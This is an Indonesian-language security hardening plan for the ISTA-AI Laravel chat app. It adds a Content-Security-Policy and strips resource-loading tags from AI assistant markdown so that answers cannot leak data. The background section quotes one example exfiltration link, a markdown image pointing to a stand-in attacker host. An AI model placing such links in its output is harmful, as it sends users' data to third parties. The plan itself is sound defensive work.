# Wave 3 CSP and Assistant Markdown Exfiltration Hardening

GitHub issue: https://github.com/Hasbi1605/ISTA-AI/issues/234

## Latar Belakang
Temuan security yang masih valid setelah Wave 1 dan Wave 2 adalah risiko exfiltration dari jawaban AI yang dirender sebagai markdown. `Str::markdown` dan renderer streaming browser sudah menolak HTML mentah berbahaya, tetapi markdown image seperti `![x](https://attacker.example/leak?... )` masih bisa berubah menjadi request browser ke domain eksternal. Tanpa Content-Security-Policy aplikasi, browser tidak punya batasan eksplisit untuk `img-src`, `connect-src`, dan framing.

## Tujuan
- Mencegah jawaban AI memuat gambar/media eksternal dari markdown.
- Menambahkan CSP konservatif yang membatasi sumber resource browser, terutama `img-src`.
- Menjaga chat, Livewire, Alpine, Vite asset, Google Fonts, dan OnlyOffice tetap berjalan.

## Ruang Lingkup
- Tambah sanitizer khusus assistant markdown untuk HTML final/persisted chat.
- Terapkan sanitizer tersebut saat render bubble jawaban AI dan saat export/upload jawaban AI.
- Perketat sanitizer streaming markdown di browser agar tag media/resource eksternal dihapus.
- Tambah middleware security header untuk CSP dan header pendukung yang aman.
- Tambah test regresi untuk CSP header dan markdown image stripping.

## Di Luar Scope
- Migrasi secret `.env.droplet` ke secret manager.
- Secret rotation.
- Perubahan trusted proxy, signed URL OnlyOffice, atau sanitizer export dokumen Wave 2.
- Implementasi CSP nonce penuh untuk seluruh inline script.
- Deploy production langsung.

## Area / File Terkait
- `laravel/bootstrap/app.php`
- `laravel/config/security.php`
- `laravel/app/Http/Middleware/AddSecurityHeaders.php`
- `laravel/app/Support/SafeAssistantMarkdown.php`
- `laravel/app/Livewire/Chat/ChatIndex.php`
- `laravel/resources/views/livewire/chat/partials/chat-messages.blade.php`
- `laravel/resources/js/chat-page.js`
- `laravel/.env.example`
- `deploy/digitalocean.env.example`
- Test feature/security dan test chat yang relevan.

## Risiko
- CSP yang terlalu ketat bisa memblokir script inline yang masih dipakai Alpine/Livewire atau editor OnlyOffice.
- Menghapus image markdown dapat mengubah tampilan jawaban AI yang sebelumnya berisi gambar, tetapi ini disengaja untuk menghindari request eksternal.
- Sanitizer HTML harus cukup sempit untuk menutup resource loading, tetapi cukup ringan agar tidak merusak markdown teks, link aman, list, code, dan tabel.

## Langkah Implementasi
1. Tambah config CSP/security header dengan source list konservatif dan allowlist dev/OnlyOffice seperlunya.
2. Tambah middleware yang memasang CSP dan header security pendukung bila response HTML belum punya header tersebut.
3. Tambah helper `SafeAssistantMarkdown` untuk render markdown dengan opsi aman lalu menghapus tag resource-loading seperti `img`, `picture`, `source`, `iframe`, `svg`, `video`, dan `audio`.
4. Gunakan helper tersebut di render bubble chat dan export/upload jawaban AI.
5. Perketat DOMPurify di renderer streaming markdown browser dengan forbid tag/attr resource-loading.
6. Tambah test untuk memastikan CSP muncul dan markdown image eksternal tidak muncul sebagai `<img>`.
7. Jalankan formatter, build asset bila JS berubah, targeted test, full Laravel test, dan audit dependency.

## Rencana Test
- Test HTTP response dashboard/chat memiliki `Content-Security-Policy` dengan `img-src 'self' data: blob:` dan `object-src 'none'`.
- Test jawaban assistant berisi markdown image eksternal tidak menghasilkan `<img>` atau URL eksternal di HTML bubble.
- Test markdown link biasa tetap dirender.
- Test Google Drive export jawaban AI memakai HTML yang sudah dibersihkan dari image eksternal.
- Jalankan `vendor/bin/pint --test --dirty`.
- Jalankan `npm run build`.
- Jalankan targeted Laravel tests untuk Chat UI, CloudStorage upload, dan security header.
- Jalankan `php artisan test`.
- Jalankan `composer audit --locked` dan `npm audit --audit-level=high`.

## Kriteria Selesai
- GitHub issue dibuat dan linked di plan.
- Branch Wave 3 berisi hanya scope CSP/assistant markdown hardening.
- Test baru menutup CSP dan markdown image stripping.
- Verifikasi Laravel dan asset build lulus.
- Branch dipush dan PR dibuat ke `main`.
